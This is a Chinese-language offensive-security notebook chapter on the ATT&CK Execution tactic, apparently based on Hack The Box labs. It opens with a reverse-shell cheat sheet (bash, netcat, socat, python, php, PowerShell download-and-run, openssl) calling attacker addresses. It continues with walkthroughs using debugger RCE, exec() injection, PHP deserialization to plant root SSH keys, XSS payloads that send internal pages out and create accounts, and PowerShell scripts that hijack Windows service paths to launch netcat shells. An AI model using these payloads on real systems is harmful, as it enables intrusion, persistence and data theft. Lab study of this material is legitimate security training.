# 3. Execution

## Command and Scripting Interpreter

这章主要介绍在命令行(类Unix、cmd和powershell)和各种语言解释器来执行命令，脚本或二进制文件。几个众所周知且HTB常用的getshell命令如下。后举几个代码执行利用的例子。

```shell
# bash
bash -i >& /dev/tcp/10.10.x.x/443 0>&1
/bin/bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'
exec 77<>/dev/tcp/10.10.x.x/4444;sh <&77 >&77 2>&77

exec 5<>/dev/tcp/10.10.14.17/4455
cat <&5 | while read line; do $line 2>&5 >&5; done
# netcat
nc -e /bin/sh 10.10.x.x 4444
/bin/sh | nc 10.10.x.x 4444
ncat -c bash 10.10.x.x 4444
rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc 10.10.x.x 4444 >/tmp/ff
# socat
On Kali (attacker, listens on port 8888):
	socat file:`tty`,raw,echo=0 tcp-listen:8888  
On target (launch bash):
	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.x.x:8888 
# telnet
sleep 4153|telnet 10.10.x.x 4444 | while : ; do sh && break; done 2>&1|telnet 10.10.x.x 4444 >/dev/null 2>&1 &
# python
python -c 'import socket, subprocess;s = socket.socket();s.connect(("10.10.x.x",4445))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())'

__import__('os').system('/bin/bash -c \"/bin/bash -i > /dev/tcp/10.10.x.x/4445 0>&1\"')

import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.x.x\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])
# python windows,很少用到太长不粘请自行搜索
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.10.x.x', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx:......
# php
<?php $sock=fsockopen("10.10.x.x",4445);exec("/bin/sh -i <&3 >&3 2>&3");?>
# msf
use exploit/multi/handler
		set payload windows/meterpreter/reverse_tcp
		set lhost 10.10.x.x
		set lport 4444
# powershell
powershell -c IEX(new-object net.webclient).downloadstring('http://10.10.x.x/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.x.x -Port 4444
# openssl
## 1.在vps上生成SSL证书的公钥/私钥对
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
## 2.在VPS监听反弹shell
openssl s_server -quiet -key key.pem -cert cert.pem -port 4433
## 3.在目标上用openssl加密反弹shell的流量
mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect x.x.x.x:443 > /tmp/s;rm /tmp/s
```

**1**:

靶机Ellingson  (10.10.10.139)。访问发现`http://10.10.10.139/articles/1`,当时随便试了下`http://10.10.10.139/articles/7`，结果报错，发现Werkzeug debugger 开启了。与靶机Joker (10.10.10.21)某个阶段一样，出现python developer console，直接RCE.

```python
import subprocess;subprocess.check_output(['cat','/etc/passwd'])
import subprocess;subprocess.Popen('echo "\nssh-rsa AAA...Ynk= hello@Ellingson" >> /home/hal/.ssh/authorized_keys', shell=True, stdout=subprocess.PIPE)
# ssh hal@10.10.10.139 -i ./id_rsa # ssh in.
```

**2**:

靶机Obscurity (10.10.10.168)。通过FUZZ得到http server程序SuperSecureServer.py，其serveDoc函数如下。

```python
def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        print(path)
        try:
            info = "output = 'Document: {}'"  # Keep the output for later debug
            print(info.format(path))
            exec (info.format(path))  # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
......
```

如何借由第7行RCE？得在path下功夫。经过如下反复试验，终getshell。

```shell
curl http://127.0.0.1:8080/';(os.system('dir'))%23    // it works.
curl http://127.0.0.1:8080/';(os.system('/bin/bash -c \"/bin/bash -i > /dev/tcp/127.0.0.1/4445 0>&1\"'))%23
curl http://10.10.10.168:8080/';(os.system('/bin/bash -c \"/bin/bash -i > dev/tcp/10.10.14.187/4445 0>&1\"'))%23
curl http://10.10.10.168:8080/';(os.system('rm /tmp/ff;mkfifo /tmp/ff;cat /tmp/ff|/bin/sh -i 2>&1|nc 10.10.14.187 4445 >/tmp/ff'))%23
```

**3**:

靶机Player (10.10.10.145)。查看进程，buff.php以root权限运行，其源码如下。

```php
<?php
class playBuff
{
        public $logFile="/var/log/playbuff/logs.txt";
        public $logData="Updated";

        public function __wakeup()
        {
                file_put_contents(__DIR__."/".$this->logFile,$this->logData);
        }
}
$buff = new playBuff();
$serialbuff = serialize($buff);
$data = file_get_contents("/var/lib/playbuff/merge.log");
if(unserialize($data)){
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query){
                echo 'Update Success with serialized logs!';
        }
}else{
        file_put_contents("/var/lib/playbuff/merge.log","no issues yet");
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query){
                echo 'Update Success!';
        }
}
?>
```

有__wakeup，serialize，unserialize这些函数关键词，头一个考虑php反序列化。from [Player Writeup](https://0xdf.gitlab.io/2020/01/18/htb-player.html)。

- ```php
  # vim deserialize.php
  <?php
  class playBuff
  {
          public function __construct()
          {
              $this->logFile="/../../../../../../../../root/.ssh/authorized_keys";
              $this->logData="ssh-rsa AA......AA root@kali";
          }
  }
  echo serialize(new playBuff());?>
  ```

- ```shell
  php deserialize.php
  # O:8:"playBuff":2:{s:7:"logFile";s:50:"/../../../../../../../../root/.ssh/authorized_keys";s:7:"logData";s:562:"ssh-rsa AA......AAA root@kali";}
  ```

- ```shell
  echo "O:8:"playBuff":2:......" > /var/lib/playbuff/merge.log
  # ssh in.
  ```

**4**：

靶机Crossfit (10.10.10.208)。通过其他手段知悉`http://gym-club.crossfit.htb/blog-single.php`评论处插入XSS POC，网站会告警。这里先说下告警机制。

functions.php中notifyXSS函数会将触发XSS攻击请求的时间戳、UA和IP存储到security_report库中。

```php
function notifyXSS()
{
    if(isset($_SERVER['HTTP_USER_AGENT'])){
        $ua = $_SERVER['HTTP_USER_AGENT'];
    }else{
        $ua = "None";
    }
    $ip = ip2long($_SERVER['REMOTE_ADDR']);

    require("db.php");
    if($conn)
    {
        $stmt = $conn->prepare('INSERT INTO security_report (timestamp, ua, ip) VALUES (NOW(), ?, ?)');
        $stmt->bind_param("si", $ua, $ip);
        $stmt->execute();
        $stmt->close();    
    }
}
```

```php
# report.php
<?php
$host = "localhost";$user = "";$pass = "";$db = "crossfit";
$conn = new mysqli($host, $user, $pass, $db);
if($conn)
{
    $res = $conn->query('SELECT * FROM security_report LIMIT 1');
    while($row = $res->fetch_array(MYSQLI_ASSOC))
    {
        echo "<tr>";
        echo "<td>" . $row['timestamp'] . "</td>";
        echo "<td>" . $row['ua'] . "</td>";
        echo "<td>" . long2ip($row['ip']) . "</td>";
        echo "</tr>";
        $conn->query('DELETE FROM security_report WHERE id='.$row['id']);
    }
}
?>
```

由report.php可知，当管理员查看时，存放在UA处`$row['ua']`的XSS代码会在页面加载执行。nc监听80端口，burp中POC如下。

```
POST /blog-single.php HTTP/1.1
Host: gym-club.crossfit.htb
User-Agent: <script src="http://VPN IP(tun0'ip)/"></script>
......
```

nc接受到请求，XSS有效。下面说说如何利用XSS探索内网。

通过FUZZ子域名，得到ftp.crossfit.htb，且只能内网访问。XSS出场，构造payload1.js文件存放在`python3 -m http.server 80`下，且nc监听8000端口。


```javascript
// payload1.js
xhr.onreadystatechange = function() {
    if (this.readyState === 4 && this.status === 200) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open("POST", "http://VPN IP:8000/", false);
        xhr2.send(this.responseText);
    } 
};
xhr.open("GET", "http://ftp.crossfit.htb", false);
xhr.send();
```

再在burp中设置User-Agent如下，repeater重放，即可发现FTP Account Management页面。

```
<script src="http://VPN IP/payload1.js"></script>
```

后续2步创建ftp帐户就不详述了，整个exp.js如下。

```javascript
// official writeup payload4.js
xhr.onreadystatechange = function() {
    if (this.readyState == 4) {
        // 2) Parse the response and retrieve the anti-CSRF token (_token)
        var parser = new DOMParser();
        var doc = parser.parseFromString(this.responseText, "text/html");
        var token = doc.getElementsByName('_token')[0].value;
        var xhr3 = new XMLHttpRequest();
        xhr3.onreadystatechange = function() {
            if (this.readyState == 4) {
                // 4) Sends result back to netcat listener
                var xhr4 = new XMLHttpRequest();
                xhr4.open("POST", "http://VPN ip:8000/", false);
                xhr4.send(this.responseText);
            }
        };
        // 3) Make a POST request to the /accounts page to add a new user
        xhr3.open("POST", "http://ftp.crossfit.htb/accounts", false);
        xhr3.withCredentials = true;
        xhr3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        var params = "username=sheeraz&pass=sheeraz&_token=" + token;
        xhr3.send(params);
    }
};
// 1) Get the /accounts/create page
xhr.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
xhr.withCredentials = true;
xhr.send();
```

## System Services

这一节[Service Execution ](https://attack.mitre.org/techniques/T1569/002)官网举例sc.exe与NET，net倒常见，这里说说如何利用sc。

**1** :

靶机Multimaster (10.10.10.179)。已横移到jorden用户，且通过`net user`命令发现jorden属于本地组`Server Operators group`. 这个组有如下权限。

> - Log on locally to the server console
> - Change the system time
> - create and delete network shares;
> - start and stop  services
> - Back up files and directories
> - Restore files and directories
> - format the hard disk of the  computer
> - Shut down the system
> - Force shutdown from a remote system

这里选择services攻破。

```powershell
# from winPEAS.bat
# enum services,save and restore it to ensure you can modify it.
for /f %%a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv >nul 2>&1 & reg save %%a %temp%\reg.hiv >nul 2>&1 && reg restore %%a %temp%\reg.hiv >nul 2>&1 && ECHO.You can modify %%a

# exploit
sc.exe config browser binPath= "C:\programdata\nc64.exe -e cmd.exe 10.10.x.x 443"
sc.exe stop browser
sc.exe start browser
```

官方writeup用此`sc.exe config browser binPath=C:\windows\System32\cmd.exe /c net user administrator ...password...`,然后game over。

```bash
psexec.py administrator@10.10.10.179
```

**2**:

靶机Control (10.10.10.167)。已经横移到hector用户，且通过`get-acl HKLM:\SYSTEM\CurrentControlSet\Services | fl`可知hector有`FullControl`权限，但不能执行`sc.exe config`命令。起码能想到在`service binPath`做文章。

看看别人家的孩子写的精细化方案，够劲。

```powershell
# Command to be executed on successful exploitation
$cmd = "C:\inetpub\wwwroot\uploads\nc.exe 10.10.x.x 444 -e powershell.exe"

# Create a list of services
$otp = ./accesschk.exe "Hector" -kvuqsv hklm:\System\CurrentControlSet\Services
$services = $otp.Split([Environment]::NewLine)

# Loop through each service
foreach($service in $services) {
	# If the current line is not a service, skip it
	if(!$service.StartsWith("RW HKLM")) {
		continue
	}
	# Validate that the line is indeed a service
	$name = $service.Split("\\")[-1].Split([Environment]::NewLine)[0]
	$s = Get-Service -Name $name -ErrorAction SilentlyContinue
	if(!$s) {
		continue
	}
	echo $service
	$serv = $service.Split(" ")[-1].Split([Environment]::NewLine)[0]
	echo $serv
	# Attempt to exploit the service:
	# 1. Change the service's binary path to $cmd
	# 2. Restart the service
	if($s.Status -eq 'Running') {
		reg add $serv /v ImagePath /t REG_EXPAND_SZ /d "$cmd" /f >a.txt
		if((Get-Service -Name $name).Status -eq 'Running') {
			Get-Service -Name $name | Stop-Service -ErrorAction SilentlyContinue
			Write-Host "[STOP] "$name
		}
	} elseif ($s.Status -eq 'Stopped') {
		reg add $serv /v ImagePath /t REG_EXPAND_SZ /d "$cmd" /f >a.txt
		if((Get-Service -Name $name).Status -eq 'Stopped') {
			Get-Service -Name $name | Start-Service -ErrorAction SilentlyContinue
			Write-Host "[START] "$name
		}
	}
}
```

看看论坛里的表哥，走爆破路线。

```powershell
$services = ls HKLM:\SYSTEM\CurrentControlset\Services
foreach ($service in $services){
    reg.exe add $service.Name /v ImagePath /t REG_EXPAND_SZ /d "C:\windows\temp\ncat.exe 10.10.x.x 443 -e cmd" /f
    Start-Service -name $service.Name.Split("\\")[-1] 
}
```



## Scheduled Task/Job

一般情况下，get root.txt就表示已攻破machine，这时可以看看machine maker(s)写的scheduled程序，删特定账户或备份文件。真实攻防中攻击者用此做[Persistence ](https://attack.mitre.org/tactics/TA0003)，而这在HTB中意义不大。

```powershell
crontab -l
schtasks /query /fo LIST /v
```

## User Execution

Malicious Link,Malicious File技术 已在`2. Initial Access`提过。

## Windows Management Instrumentation

WMI技术的案例会散在后文详述。
